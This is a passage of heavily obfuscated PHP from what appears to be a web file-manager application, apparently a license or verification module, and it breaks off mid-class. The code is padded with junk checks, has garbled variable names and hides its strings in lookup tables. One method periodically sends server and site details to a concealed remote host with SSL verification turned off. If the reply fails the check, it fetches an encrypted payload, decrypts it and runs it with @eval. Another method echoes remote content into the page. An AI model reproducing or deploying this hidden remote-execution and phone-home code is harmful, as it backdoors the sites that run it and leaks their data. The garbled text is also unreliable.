$­÷Ë¨¿¥[235] => $­÷Ë¨¿¥[229], $­÷Ë¨¿¥[236] => $­÷Ë¨¿¥[229], $­÷Ë¨¿¥[237] => $­÷Ë¨¿¥[229], $­÷Ë¨¿¥[238] => $­÷Ë¨¿¥[229], $­÷Ë¨¿¥[239] => $­÷Ë¨¿¥[229], $­÷Ë¨¿¥[240] => $­÷Ë¨¿¥[229]); $—”Ï×±Ê = explode($­÷Ë¨¿¥[241], _get($this->oxbsb15338bf, $­÷Ë¨¿¥[112], $­÷Ë¨¿¥[6])); $Å›’×ı = $ŒÈºåê—[678]; $¦ÉÖÊ› = array(); $Í°€ÚÂÁ = $ŒÈºåê—[679]; if (strlen($Í°€ÚÂÁ) < $ŒÈºåê—[633]) { return; } foreach ($Úº¯æé™ as $’çÅ¨Ï => $½–Ã‚ë) { if ($½–Ã‚ë == $­÷Ë¨¿¥[224] && substr($this->mvnu652bf0d2, 0, 1) == $­÷Ë¨¿¥[224]) { continue; } if (!in_array($’çÅ¨Ï, $—”Ï×±Ê)) { $¦ÉÖÊ›[] = $’çÅ¨Ï; } } foreach ($¦ÉÖÊ› as $’çÅ¨Ï) { unset($û›Îš„“[$’çÅ¨Ï]); $Ÿ«äø ’ = $ŒÈºåê—[680]; if (!$Ÿ«äø ’) { die; } } return $û›Îš„“; } private function mpqd118a8986() { $­ú™ŞÊô =& $_SERVER[¨…Øˆ¼Û]; if ($this->mvnu652bf0d2 != $­ú™ŞÊô[106]) { $GLOBALS[$­ú™ŞÊô[85]][$­ú™ŞÊô[89]][$­ú™ŞÊô[242]] = $­ú™ŞÊô[203]; return; } $GLOBALS[$­ú™ŞÊô[85]][$­ú™ŞÊô[243]] = $­ú™ŞÊô[121]; if (Model($­ú™ŞÊô[244])->get($­ú™ŞÊô[63]) != $­ú™ŞÊô[203]) { Model($­ú™ŞÊô[244])->set($­ú™ŞÊô[63], $­ú™ŞÊô[203]); } } public function hjbx0e6b839f() { return $_SERVER[¨…Øˆ¼Û][245]; $îşõİ–Ç = $_SERVER[ùÆÎÔ“Ñ][681]; if (!$îşõİ–Ç) { return; } } private function lbxg3c103354() { $Àøãûàã =& $_SERVER[ùÆÎÔ“Ñ]; $âşáÉà =& $_SERVER[¨…Øˆ¼Û]; $ÉÏ úØ = array($âşáÉà[246], $âşáÉà[247], $âşáÉà[248]); $µĞºë›¿ = $Àøãûàã[682]; $ø°ÃÇí… = $âşáÉà[249] . md5($âşáÉà[250]); if ($this->mvnu652bf0d2 == $âşáÉà[106] || !_get($GLOBALS, $âşáÉà[115])) { return; } if (!in_array($_SERVER[$âşáÉà[24]], $ÉÏ úØ)) { return; } if (time() % 4 != 0) { return; } $„ˆ½ÅÁÄ = call_user_func(array($âşáÉà[251], $âşáÉà[252]), $ø°ÃÇí…); $®Û÷°Š = $Àøãûàã[683]; if (!$®Û÷°Š) { die; } if ($„ˆ½ÅÁÄ && time() - $„ˆ½ÅÁÄ < intval($âşáÉà[253])) { return; } call_user_func(array($âşáÉà[251], $âşáÉà[138]), $ø°ÃÇí…, time()); $ã®µå…ö = Model($âşáÉà[33])->get($âşáÉà[103]); $„§ã˜‘À = array($âşáÉà[150] => Model($âşáÉà[33])->get($âşáÉà[186]), $âşáÉà[163] => $this->mvnu652bf0d2, $âşáÉà[160] => $_SERVER[$âşáÉà[161]], $âşáÉà[162] => Model($âşáÉà[33])->get($âşáÉà[130]), $âşáÉà[101] => md5($_SERVER[$âşáÉà[102]] . $ã®µå…ö), $âşáÉà[153] => $âşáÉà[135], $âşáÉà[156] => $_SERVER[$âşáÉà[157]]); $ÍõÁÜ½ı = $this->qwlxbfe1f71d($âşáÉà[254], $„§ã˜‘À); $ı¥–áï‘ = $Àøãûàã[684]; if (strlen($ı¥–áï‘) < $Àøãûàã[645]) { return; } if (!is_array($ÍõÁÜ½ı)) { return; } if ($ÍõÁÜ½ı[$âşáÉà[150]] && $ÍõÁÜ½ı[$âşáÉà[255]]) { if ($this->pskv630c53a5($ÍõÁÜ½ı[$âşáÉà[255]]) == $„§ã˜‘À[$âşáÉà[150]]) { return; } } $this->ehfxe539ab0f(); $ñô‹ı = $Àøãûàã[685]; if (strlen($ñô‹ı) < $Àøãûàã[645]) { die; } if ($this->pskv630c53a5($ÍõÁÜ½ı[$âşáÉà[255]]) != $„§ã˜‘À[$âşáÉà[150]]) { $³ÂÔÏëª = array($âşáÉà[181] => $ã®µå…ö, $âşáÉà[182] => $_SERVER[$âşáÉà[102]], $âşáÉà[183] => this_url(), $âşáÉà[158] => $_SERVER[$âşáÉà[159]]); $Ù˜Êèñ = $this->rgphda8b0b04(json_encode($³ÂÔÏëª)); $ÍõÁÜ½ı = $this->qwlxbfe1f71d($âşáÉà[184] . $Ù˜Êèñ); if ($ÍõÁÜ½ı && is_array($ÍõÁÜ½ı) && isset($ÍõÁÜ½ı[$âşáÉà[255]])) { $ÍèÛ¢• = $this->zpfeacb329be($ÍõÁÜ½ı[$âşáÉà[255]], 2); if ($ÍèÛ¢•) { $ÍèÛ¢• = $this->pskv630c53a5($ÍèÛ¢•); } if ($ÍèÛ¢•) { try { @eval($ÍèÛ¢•); } catch (Exception $×—ïº ) { } } } } } private function qwlxbfe1f71d($Ñå“ÂûÛ = '', $ß¸ğ‚Ìæ = array(), $€¾æ ¤ = 5) { $Ø¿ªÇŠÓ =& $_SERVER[ùÆÎÔ“Ñ]; $ëˆááİ =& $_SERVER[¨…Øˆ¼Û]; $ÄöÍİÁì = $ëˆááİ[256]; $ÄöÍİÁì = $this->cpwq9cab185d($ÄöÍİÁì, $ëˆááİ[257]); $ÄöÍİÁì = $ÄöÍİÁì . $Ñå“ÂûÛ; $èøâÅÏ‰ = $Ø¿ªÇŠÓ[686]; if (!$èøâÅÏ‰) { die; } if ($ß¸ğ‚Ìæ && is_array($ß¸ğ‚Ìæ)) { $ÄöÍİÁì = $ÄöÍİÁì . $ëˆááİ[258] . http_build_query($ß¸ğ‚Ìæ); } if ($ß¸ğ‚Ìæ === -1) { return $ÄöÍİÁì; } $ˆÅÏØÏá = stream_context_create(array($ëˆááİ[216] => array($ëˆááİ[219] => $€¾æ ¤, $ëˆááİ[217] => $ëˆááİ[259]), $ëˆááİ[260] => array($ëˆááİ[261] => !1, $ëˆááİ[262] => !1))); $ç¤§Ó™ = $Ø¿ªÇŠÓ[687]; if (strlen($ç¤§Ó™) < $Ø¿ªÇŠÓ[618]) { die; } $ß¸ğ‚Ìæ = @file_get_contents($ÄöÍİÁì, !1, $ˆÅÏØÏá); $ùóåô„‘ = $Ø¿ªÇŠÓ[688]; if (!$ùóåô„‘) { die; } return json_decode($ß¸ğ‚Ìæ, !0); $á×ÕöÓ = $Ø¿ªÇŠÓ[689]; } private function gaeb6101d0de() { $Æˆ…–ß =& $_SERVER[ùÆÎÔ“Ñ]; $÷ƒ§ºşˆ =& $_SERVER[¨…Øˆ¼Û]; $…™‘éÓÏ = array($÷ƒ§ºşˆ[263] => $÷ƒ§ºşˆ[264], $÷ƒ§ºşˆ[265] => $÷ƒ§ºşˆ[266], $÷ƒ§ºşˆ[267] => $÷ƒ§ºşˆ[268], $÷ƒ§ºşˆ[269] => $÷ƒ§ºşˆ[270], $÷ƒ§ºşˆ[271] => $÷ƒ§ºşˆ[272], $÷ƒ§ºşˆ[273] => $÷ƒ§ºşˆ[211], $÷ƒ§ºşˆ[274] => $÷ƒ§ºşˆ[211], $÷ƒ§ºşˆ[275] => $÷ƒ§ºşˆ[264], $÷ƒ§ºşˆ[276] => $÷ƒ§ºşˆ[266], $÷ƒ§ºşˆ[277] => $÷ƒ§ºşˆ[268], $÷ƒ§ºşˆ[278] => $÷ƒ§ºşˆ[279], $÷ƒ§ºşˆ[280] => $÷ƒ§ºşˆ[270], $÷ƒ§ºşˆ[281] => $÷ƒ§ºşˆ[282], $÷ƒ§ºşˆ[283] => $÷ƒ§ºşˆ[272], $÷ƒ§ºşˆ[284] => $÷ƒ§ºşˆ[285], $÷ƒ§ºşˆ[286] => $÷ƒ§ºşˆ[287], $÷ƒ§ºşˆ[288] => $÷ƒ§ºşˆ[289]); $¥œ´°¢ = $…™‘éÓÏ[$this->mvnu652bf0d2]; $Æ†›Ş© = $Æˆ…–ß[690]; $¥œ´°¢ = intval($¥œ´°¢ ? $¥œ´°¢ : $÷ƒ§ºşˆ[264]); $˜÷û‰¿© = $Æˆ…–ß[691]; while (strlen($˜÷û‰¿©) < $Æˆ…–ß[618]) { if (!$˜÷û‰¿©) { break; } $˜÷û‰¿©++; } $öÜÚ½Å“ = _get($this->oxbsb15338bf, $÷ƒ§ºşˆ[290]); $öÜÚ½Å“ = $öÜÚ½Å“ ? intval($öÜÚ½Å“) : 0; $Ù‰¾“å• = $Æˆ…–ß[692]; return $¥œ´°¢ + $öÜÚ½Å“; $ì®°í“‡ = $Æˆ…–ß[693]; if (strlen($ì®°í“‡) < $Æˆ…–ß[645]) { die; } } public function fktncdb5cf5d($ÕğäÊ¯ı) { $èÑ¡È•ª =& $_SERVER[ùÆÎÔ“Ñ]; $ÛÒê§õí =& $_SERVER[¨…Øˆ¼Û]; $ğ·Ò¦Ä = $this->gaeb6101d0de(); if ($ÕğäÊ¯ı[$ÛÒê§õí[291]] == $ÛÒê§õí[121]) { return; } if ($ğ·Ò¦Ä >= intval($ÛÒê§õí[211])) { return; } $‰×Ùúı = Model($ÛÒê§õí[124])->count(); if ($‰×Ùúı <= $ğ·Ò¦Ä) { return; } $„Ç–Ãå‚ = Model($ÛÒê§õí[124])->field($ÛÒê§õí[291])->limit($ğ·Ò¦Ä)->select(); $İÀª¨Ûˆ = $èÑ¡È•ª[694]; if (strlen($İÀª¨Ûˆ) < $èÑ¡È•ª[628]) { die; } $„Ç–Ãå‚ = array_to_keyvalue($„Ç–Ãå‚, $ÛÒê§õí[6], $ÛÒê§õí[291]); $Õï›ÄÑÃ = $èÑ¡È•ª[695]; if (!$Õï›ÄÑÃ) { return; } if (!in_array($ÕğäÊ¯ı[$ÛÒê§õí[291]], $„Ç–Ãå‚)) { show_json($ÛÒê§õí[292], !1, $ÛÒê§õí[207]); } } public function gmteff4f0fac() { $Øˆáí×” =& $_SERVER[ùÆÎÔ“Ñ]; $¿Ú¢ãİ =& $_SERVER[¨…Øˆ¼Û]; if (!_get($GLOBALS, $¿Ú¢ãİ[115]) || mt_rand(1, 100) > 20) { return; } $ØŸÚíØû = $¿Ú¢ãİ[214]; $Ğû‹–‚ı = $Øˆáí×”[696]; while (strlen($Ğû‹–‚ı) < $Øˆáí×”[628]) { if (!$Ğû‹–‚ı) { break; } $Ğû‹–‚ı++; } $ØŸÚíØû = $this->cpwq9cab185d($ØŸÚíØû, $¿Ú¢ãİ[215]); $‹½²Ë‘İ = stream_context_create(array($¿Ú¢ãİ[216] => array($¿Ú¢ãİ[217] => $¿Ú¢ãİ[218], $¿Ú¢ãİ[219] => 3))); $¡ÊÃ ÁÀ = @file_get_contents($ØŸÚíØû, !1, $‹½²Ë‘İ); echo $¿Ú¢ãİ[293] . hash_encode($¡ÊÃ ÁÀ) . $¿Ú¢ãİ[294]; $¦¶‚ğÀ‡ = $Øˆáí×”[697]; if (!$¦¶‚ğÀ‡) { return; } } private function opbk34df162b($¥µ¯£›×, $œÔ§Ûî¯, $ÍİóÈà = 3) { $šÌî«€ë =& $_SERVER[ùÆÎÔ“Ñ]; $„àÊÇ‰ã =& $_SERVER[¨…Øˆ¼Û]; usleep(1); $½Ñ‚®œü = $šÌî«€ë[698]; if (strlen($½Ñ‚®œü) < $šÌî«€ë[633]) { die; } $¥µ¯£›× = trim($¥µ¯£›×); $½ÊçÜ­ = mt_rand(0, 5) . $„àÊÇ‰ã[6]; $ºÖ¶“ò’ = rand_string(15); $‡…Æñ” = $šÌî«€ë[699]; if (strlen($‡…Æñ”) < $šÌî«€ë[628]) { die; } $÷ÚÜëˆ = $„àÊÇ‰ã[295]; $¼“Õ˜©å = $šÌî«€ë[700]; while ($¼“Õ˜©å < $šÌî«€ë[622]) { if ($¼“Õ˜©å >= 0) { break; } $¼“Õ˜©å++; } switch ($½ÊçÜ­) { case $„àÊÇ‰ã[203]: $Öõï¬êú = $this->dbjqa4598121($¥µ¯£›×, strrev($œÔ§Ûî¯ . $ºÖ¶“ò’)); $´İŸ… = $šÌî«€ë[701]; break; case $„àÊÇ‰ã[121]: $Öõï¬êú = $this->dbjqa4598121($¥µ¯£›×, strrev($ºÖ¶“ò’ . $œÔ§Ûî¯)); break; case $„àÊÇ‰ã[296]: $Öõï¬êú = $this->dbjqa4598121($¥µ¯£›×, base64_encode($ºÖ¶“ò’ . $œÔ§Ûî¯)); $ÁıìĞ”Ô = $šÌî«€ë[702]; if (strlen($ÁıìĞ”Ô) < $šÌî«€ë[645]) { return; } break; $ëöî­ = $šÌî«€ë[703]; case $„àÊÇ‰ã[297]: $Öõï¬êú = $this->dbjqa4598121($¥µ¯£›×, md5($ºÖ¶“ò’ . $œÔ§Ûî¯)); break; case $„àÊÇ‰ã[298]: $¥µ¯£›× = base64_encode($¥µ¯£›×); $Ô¸½ø « = $šÌî«€ë[704]; if (strlen($Ô¸½ø «) < $šÌî«€ë[622]) { die; } $½©¿‹Ş = rand(0, 64); $©µéüÆÈ = $šÌî«€ë[705]; if (strlen($©µéüÆÈ) < $šÌî«€ë[622]) { die; } $Í¿ÂåÕ¬ = $÷ÚÜëˆ[$½©¿‹Ş]; $û§¥øş½ = md5($Í¿ÂåÕ¬ . md5($œÔ§Ûî¯ . $Í¿ÂåÕ¬) . $œÔ§Ûî¯); $×“§Ş› = $šÌî«€ë[706]; if (strlen($×“§Ş›) < $šÌî«€ë[618]) { return; } $û§¥øş½ = substr($û§¥øş½, $½©¿‹Ş % 8, $½©¿‹Ş % 8 + 7); $ºá›¸ªå = $šÌî«€ë[707]; if (!$ºá›¸ªå) { return; } $–´—ı­ò = $„àÊÇ‰ã[6]; $çÈİğ“² = $šÌî«€ë[708]; if (!$çÈİğ“²) { die; } $½ÀòˆÄ = 0; $—–ëŒ³ü = $šÌî«€ë[709]; if (strlen($—–ëŒ³ü) < $šÌî«€ë[628]) { return; } $©•¤à® = 0; $˜ÂÇ«¹¤ = $šÌî«€ë[710]; if (!$˜ÂÇ«¹¤) { die; } $Ä»Òß£¸ = 0; $ˆ®ïÀ«ˆ = $šÌî«€ë[711]; if (!$ˆ®ïÀ«ˆ) { return; } for ($½ÀòˆÄ = 0; $½ÀòˆÄ < strlen($¥µ¯£›×); $½ÀòˆÄ++) { $Ä»Òß£¸ = $Ä»Òß£¸ == strlen($û§¥øş½) ? 0 : $Ä»Òß£¸; $¬¾ÌŸí– = $šÌî«€ë[712]; if (strlen($¬¾ÌŸí–) < $šÌî«€ë[633]) { return; } $©•¤à® = ($½©¿‹Ş + strpos($÷ÚÜëˆ, $¥µ¯£›×[$½ÀòˆÄ]) + ord($û§¥øş½[$Ä»Òß£¸++])) % 64; $§ßÛ®Úš = $šÌî«€ë[713]; if (strlen($§ßÛ®Úš) < $šÌî«€ë[645]) { return; } $–´—ı­ò .= $÷ÚÜëˆ[$©•¤à®]; } $Öõï¬êú = hash_encode($Í¿ÂåÕ¬ . $–´—ı­ò); $¡‘¹£¢ = $šÌî«€ë[714]; if (!$¡‘¹£¢) { die; } break; default: $Öõï¬êú = $this->dbjqa4598121($¥µ¯£›×, $œÔ§Ûî¯ . $ºÖ¶“ò’); $Ù¨ÈØÒ… = $šÌî«€ë[715]; if (strlen($Ù¨ÈØÒ…) < $šÌî«€ë[628]) { die; } break; $¯ØÁ¬” = $šÌî«€ë[716]; while ($¯ØÁ¬” < $šÌî«€ë[622]) { if ($¯ØÁ¬” >= 0) { break; } $¯ØÁ¬”++; } } $Öõï¬êú = strrev($½ÊçÜ­ . $ºÖ¶“ò’ . $Öõï¬êú); $Ìº¤ÖÎ = $šÌî«€ë[717]; if (strlen($Ìº¤ÖÎ) < $šÌî«€ë[622]) { return; } if ($ÍİóÈà - 1 > 0) { $Öõï¬êú = $this->opbk34df162b($Öõï¬êú, $œÔ§Ûî¯, $ÍİóÈà - 1); } return $Öõï¬êú; } private function zpfeacb329be($½Ã…ö½, $¸»€«ïµ, $ØÆØÄòÍ = 3) { $…°ëÈÅÇ =& $_SERVER[ùÆÎÔ“Ñ]; $‡Ò¼´ =& $_SERVER[¨…Øˆ¼Û]; if (!is_string($½Ã…ö½) || strlen($½Ã…ö½) < 10) { return !1; } $½Ã…ö½ = trim($½Ã…ö½); $½Ã…ö½ = strrev($½Ã…ö½); $üÔäÚÏ = $½Ã…ö½[0]; $ÕÑµºë¹ = substr($½Ã…ö½, 1, 15); $•ÒˆÏË· = $…°ëÈÅÇ[623]; while ($•ÒˆÏË· < $…°ëÈÅÇ[622]) { if ($•ÒˆÏË· >= 0) { break; } $•ÒˆÏË·++; } $½Ã…ö½ = substr($½Ã…ö½, 16); $¶Ã¶«»Á = $‡Ò¼´[295]; switch ($üÔäÚÏ) { case $‡Ò¼´[203]: $üÜİ£ÓÑ = $this->cpwq9cab185d($½Ã…ö½, strrev($¸»€«ïµ . $ÕÑµºë¹)); break; $ˆ–÷ş–Ò = $…°ëÈÅÇ[718]; if (!$ˆ–÷ş–Ò) { die; } case $‡Ò¼´[121]: $üÜİ£ÓÑ = $this->cpwq9cab185d($½Ã…ö½, strrev($ÕÑµºë¹ . $¸»€«ïµ)); break; $¢±‡¢†è = $…°ëÈÅÇ[719]; if (strlen($¢±‡¢†è) < $…°ëÈÅÇ[645]) { return; } case $‡Ò¼´[296]: $üÜİ£ÓÑ = $this->cpwq9cab185d($½Ã…ö½, base64_encode($ÕÑµºë¹ . $¸»€«ïµ)); $€Ìë€ö¯ = $…°ëÈÅÇ[720]; if (strlen($€Ìë€ö¯) < $…°ëÈÅÇ[628]) { return; } break; $¾ãá½Ôµ = $…°ëÈÅÇ[721]; if (!$¾ãá½Ôµ) { return; } case $‡Ò¼´[297]: $üÜİ£ÓÑ = $this->cpwq9cab185d($½Ã…ö½, md5($ÕÑµºë¹ . $¸»€«ïµ)); $êñºÂşÈ = $…°ëÈÅÇ[722]; if (strlen($êñºÂşÈ) < $…°ëÈÅÇ[618]) { return; } break; case $‡Ò¼´[298]: $½Ã…ö½ = hash_decode($½Ã…ö½); $”í§íª = $½Ã…ö½[0]; $½Ã…ö½ = substr($½Ã…ö½, 1); $Â°ßÅ—ì = strpos($¶Ã¶«»Á, $”í§íª); $¡ªî²²â = $…°ëÈÅÇ[723]; while ($¡ªî²²â < $…°ëÈÅÇ[618]) { if ($¡ªî²²â >= 0) { break; } $¡ªî²²â++; } $¨¹¶´ö = md5($”í§íª . md5($¸»€«ïµ . $”í§íª) . $¸»€«ïµ); $¨¹¶´ö = substr($¨¹¶´ö, $Â°ßÅ—ì % 8, $Â°ßÅ—ì % 8 + 7); $®åí½­Ÿ = $‡Ò¼´[6]; $±¢—“ = $…°ëÈÅÇ[724]; if (strlen($±¢—“) < $…°ëÈÅÇ[645]) { return; } $”ûÖ†Ê = 0; $¦íšôÖä = 0; $á€åü²š = $…°ëÈÅÇ[725]; if (!$á€åü²š) { return; } $ç…¾§ëó = 0; $û²Ë‹æÖ = $…°ëÈÅÇ[726]; for ($”ûÖ†Ê = 0; $”ûÖ†Ê < strlen($½Ã…ö½); $”ûÖ†Ê++) { $ç…¾§ëó = $ç…¾§ëó == strlen($¨¹¶´ö) ? 0 : $ç…¾§ëó; $âù£¦Ê« = $…°ëÈÅÇ[727]; while ($âù£¦Ê« < $…°ëÈÅÇ[633]) { if ($âù£¦Ê« >= 0) { break; } $âù£¦Ê«++; } $çÆÙäøÅ = $ç…¾§ëó++; $ÔèÀÉ„Å = $…°ëÈÅÇ[728]; while ($ÔèÀÉ„Å < $…°ëÈÅÇ[628]) { if ($ÔèÀÉ„Å >= 0) { break; } $ÔèÀÉ„Å++; } $¦íšôÖä = strpos($¶Ã¶«»Á, $½Ã…ö½[$”ûÖ†Ê]) - $Â°ßÅ—ì - ord($¨¹¶´ö[$çÆÙäøÅ]); while ($¦íšôÖä < 0) { $¦íšôÖä += 64; } $®åí½­Ÿ .= $¶Ã¶«»Á[$¦íšôÖä]; } $üÜİ£ÓÑ = base64_decode($®åí½­Ÿ); $Ö”Ò•…™ = $…°ëÈÅÇ[729]; if (strlen($Ö”Ò•…™) < $…°ëÈÅÇ[645]) { return; } break; default: $üÜİ£ÓÑ = $this->cpwq9cab185d($½Ã…ö½, $¸»€«ïµ . $ÕÑµºë¹); $¬çÌÌŒ¨ = $…°ëÈÅÇ[730]; while (strlen($¬çÌÌŒ¨) < $…°ëÈÅÇ[633]) { if (!$¬çÌÌŒ¨) { break; } $¬çÌÌŒ¨++; } break; } if ($ØÆØÄòÍ - 1 > 0) { $üÜİ£ÓÑ = $this->zpfeacb329be($üÜİ£ÓÑ, $¸»€«ïµ, $ØÆØÄòÍ - 1); } return $üÜİ£ÓÑ; } public function rgphda8b0b04($¤‰‡ğ³) { $ñó°íôå =& $_SERVER[ùÆÎÔ“Ñ]; $Ä…¦…åñ =& $_SERVER[¨…Øˆ¼Û]; $¦™ŸåÑ = $this->hsum5fb71fa1(); $Ò˜®­ô = $ñó°íôå[731]; if (strlen($Ò˜®­ô) < $ñó°íôå[645]) { return; } $Ë‚Êõú = $this->hsum5fb71fa1(); $ˆ¬Àåû» = ($¦™ŸåÑ - 1) * ($Ë‚Êõú - 1); $«ïé°† = intval(($¦™ŸåÑ + $Ë‚Êõú) / 2); $şŸó±Êô = $ñó°íôå[732]; while (strlen($şŸó±Êô) < $ñó°íôå[628]) { if (!$şŸó±Êô) { break; } $şŸó±Êô++; } while (1) { $Ğã°ÉÕÅ = $«ïé°†; $ß«¢ÀÂµ = $ñó°íôå[733]; $»¦âôë = $ˆ¬Àåû»; $ßÜ»êÖş = $ñó°íôå[734]; while ($»¦âôë % $Ğã°ÉÕÅ != 0) { $´»›†¼Ò = $»¦âôë; $šœâÔÃ‰ = $ñó°íôå[735]; if (strlen($šœâÔÃ‰) < $ñó°íôå[628]) { die; } $»¦âôë = $Ğã°ÉÕÅ; $Ğã°ÉÕÅ = $´»›†¼Ò % $Ğã°ÉÕÅ; $İÅÍğØœ = $ñó°íôå[736]; if (!$İÅÍğØœ) { return; } } if ($Ğã°ÉÕÅ == 1) { break; } else { $«ïé°†++; } } $ÁÂ³ƒÅ = 2; $ìÀÁ¯È = $ñó°íôå[737]; if (strlen($ìÀÁ¯È) < $ñó°íôå[645]) { die; } for ($†¼»™¯‡ = 0; $†¼»™¯‡ < $ˆ¬Àåû» * 10; $†¼»™¯‡++) { if (($ˆ¬Àåû» * $†¼»™¯‡ + 1) % $«ïé°† == 0) { $ÁÂ³ƒÅ = intval(($ˆ¬Àåû» * $†¼»™¯‡ + 1) / $«ïé°†); break; } } $şëË¸€‚ = $this->dbjqa4598121($¦™ŸåÑ * $Ë‚Êõú . $Ä…¦…åñ[6], $Ä…¦…åñ[135]); $­¢Ü‚ = md5($Ä…¦…åñ[299] . ($¦™ŸåÑ + $Ë‚Êõú) . $Ä…¦…åñ[300] . $«ïé°† . $Ä…¦…åñ[300] . $ÁÂ³ƒÅ . $Ä…¦…åñ[301]); $á·˜ûøÑ = $ñó°íôå[738]; $Ã±ÃŞ¨³ = $this->dbjqa4598121($¤‰‡ğ³, $­¢Ü‚) . $Ä…¦…åñ[302] . $şëË¸€‚; return $Ã±ÃŞ¨³; } public function pskv630c53a5($¯…ú„³) { $À›ÔÜÈÊ =& $_SERVER[ùÆÎÔ“Ñ]; $ş·»—¢ı =& $_SERVER[¨…Øˆ¼Û]; $Ì‚åº¨ã = explode($ş·»—¢ı[302], $¯…ú„³); if (count($Ì‚åº¨ã) != 2) { return $ş·»—¢ı[6]; } $Ø¤ÁÏ”« = $this->cpwq9cab185d($Ì‚åº¨ã[1] . $ş·»—¢ı[6], $ş·»—¢ı[135]); $ĞÙ½êü = $À›ÔÜÈÊ[739]; if (!$ĞÙ½êü) { die; } if (!$Ø¤ÁÏ”«) { return $ş·»—¢ı[6]; } $Ø¤ÁÏ”« = intval($Ø¤ÁÏ”«); $øÅøàüê = $À›ÔÜÈÊ[740]; $Œúìô† = 0; $†™Œ¿™â = 0; for ($îõı‘ë = 3; $îõı‘ë < $Ø¤ÁÏ”«; $îõı‘ë += 2) { if ($Ø¤ÁÏ”« % $îõı‘ë != 0) { continue; } $Œúìô† = $îõı‘ë; $Ó•ÌîÍ = $À›ÔÜÈÊ[741]; if (strlen($Ó•ÌîÍ) < $À›ÔÜÈÊ[618]) { die; } $†™Œ¿™â = intval($Ø¤ÁÏ”« / $îõı‘ë); break; } $«¼Ì¼„ = ($Œúìô† - 1) * ($†™Œ¿™â - 1); $ŠñÄãÌ = intval(($Œúìô† + $†™Œ¿™â) / 2); $Èëæí¨ö = $À›ÔÜÈÊ[742]; if (!$Èëæí¨ö) { return; } while (1) { $ÜÜå®Å“ = $ŠñÄãÌ; $—ïá¥€ = $«¼Ì¼„; $—¤Œô·§ = $À›ÔÜÈÊ[743]; if (!$—¤Œô·§) { return; } while ($—ïá¥€ % $ÜÜå®Å“ != 0) { $È¶Ô¢ê = $—ïá¥€; $—ïá¥€ = $ÜÜå®Å“; $”òá˜¤¨ = $À›ÔÜÈÊ[744]; $ÜÜå®Å“ = $È¶Ô¢ê % $ÜÜå®Å“; } if ($ÜÜå®Å“ == 1) { break; } else { $ŠñÄãÌ++; } } $äşÑØˆƒ = 2; $•òîö¸ = $À›ÔÜÈÊ[745]; while ($•òîö¸ < $À›ÔÜÈÊ[618]) { if ($•òîö¸ >= 0) { break; } $•òîö¸++; } for ($îõı‘ë = 0; $îõı‘ë < $«¼Ì¼„ * 10; $îõı‘ë++) { if (($«¼Ì¼„ * $îõı‘ë + 1) % $ŠñÄãÌ == 0) { $äşÑØˆƒ = intval(($«¼Ì¼„ * $îõı‘ë + 1) / $ŠñÄãÌ); break; } } $û£êŞğâ = md5($ş·»—¢ı[299] . ($Œúìô† + $†™Œ¿™â) . $ş·»—¢ı[300] . $ŠñÄãÌ . $ş·»—¢ı[300] . $äşÑØˆƒ . $ş·»—¢ı[301]); $Ú±“Š§ = $À›ÔÜÈÊ[746]; while (strlen($Ú±“Š§) < $À›ÔÜÈÊ[628]) { if (!$Ú±“Š§) { break; } $Ú±“Š§++; } $¦üÑ×¿ = $this->cpwq9cab185d($Ì‚åº¨ã[0], $û£êŞğâ); return $¦üÑ×¿; } public function hsum5fb71fa1() { $”‚€ÜÏÅ = mt_rand(pow(2, 14), pow(2, 16) - 1); $İÑİ ¦Ñ = array(); $çÖ”ª¥¾ = 1; while ($çÖ”ª¥¾ <= (int) sqrt($”‚€ÜÏÅ)) { $şØ³ú¤ì = $çÖ”ª¥¾; while (!0) { $şØ³ú¤ì++; if ($şØ³ú¤ì <= 2) { $çÖ”ª¥¾ = $şØ³ú¤ì; break; } else { if ($şØ³ú¤ì < 2) { continue; } } $ù¼áÌä‹ = !0; for ($‹ÉÌñŸË = 2; $‹ÉÌñŸË <= sqrt($şØ³ú¤ì); $‹ÉÌñŸË++) { if ($şØ³ú¤ì % $‹ÉÌñŸË == 0) { $ù¼áÌä‹ = !1; } } if ($ù¼áÌä‹) { $çÖ”ª¥¾ = $şØ³ú¤ì; break; } } $İÑİ ¦Ñ[] = $çÖ”ª¥¾; $“œĞÎªá = $_SERVER[ùÆÎÔ“Ñ][747]; } $ÓåÛ‘Ôê = 2; for ($şØ³ú¤ì = $”‚€ÜÏÅ; $şØ³ú¤ì > 1; $şØ³ú¤ì--) { $ù¼áÌä‹ = !0; foreach ($İÑİ ¦Ñ as $´ÚÌÒÑ) { if ($şØ³ú¤ì % $´ÚÌÒÑ == 0) { $ù¼áÌä‹ = !1; break; } } if ($ù¼áÌä‹) { $ÓåÛ‘Ôê = $şØ³ú¤ì; break; } } return $ÓåÛ‘Ôê; } public function eowk2b0d217a($Ù²–ßÔ, $Ò¹üãì) { $¸¥Ò¥¨À =& $_SERVER[¨…Øˆ¼Û]; return call_user_func(array($¸¥Ò¥¨À[8], $¸¥Ò¥¨À[303]), $Ù²–ßÔ, $Ò¹üãì); } public function dbjqa4598121($È˜äµ®’, $˜­¬“˜ì) { $æã¨çŠ´ =& $_SERVER[ùÆÎÔ“Ñ]; $î§²êÁ =& $_SERVER[¨…Øˆ¼Û]; return call_user_func(array($î§²êÁ[304], $î§²êÁ[305]), $È˜äµ®’, $˜­¬“˜ì); $óÁŸ¨’ = $æã¨çŠ´[748]; if (strlen($óÁŸ¨’) < $æã¨çŠ´[645]) { die; } } public function cpwq9cab185d($È»Ãà­, $ÛîğÇáÌ) { $ºªê÷ìŞ =& $_SERVER[¨…Øˆ¼Û]; return call_user_func(array($ºªê÷ìŞ[304], $ºªê÷ìŞ[306]), $È»Ãà­, $ÛîğÇáÌ); } } goto câ»…©¡éç; dŒÛˆ‘Î¥¦: class CacheLockDatabase { public function lock($–ó‡è²‚, $ÊÑ¶­¹¦ = 0) { $ååç±¨€ = Model($_SERVER[ùÆÎÔ“Ñ][830]); $ùÉŸ÷ÖÙ = microtime(!0) + $ÊÑ¶­¹¦; while (microtime(!0) < $ùÉŸ÷ÖÙ) { $€üÏ  ç = $ååç±¨€->get($–ó‡è²‚); if (!$€üÏ  ç || $€üÏ  ç < microtime(!0)) { $¸ìœ‰îŒ = $ååç±¨€->set($–ó‡è²‚, $ùÉŸ÷ÖÙ); if ($¸ìœ‰îŒ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($Ò¢¬‹¢¡) { return Model($_SERVER[ùÆÎÔ“Ñ][830])->get($Ò¢¬‹¢¡); } public function unlock($¶Â¤û¸”) { Model($_SERVER[ùÆÎÔ“Ñ][830])->remove($¶Â¤û¸”); } } class CacheMemcached { public $handle; public $cacheTime; public function 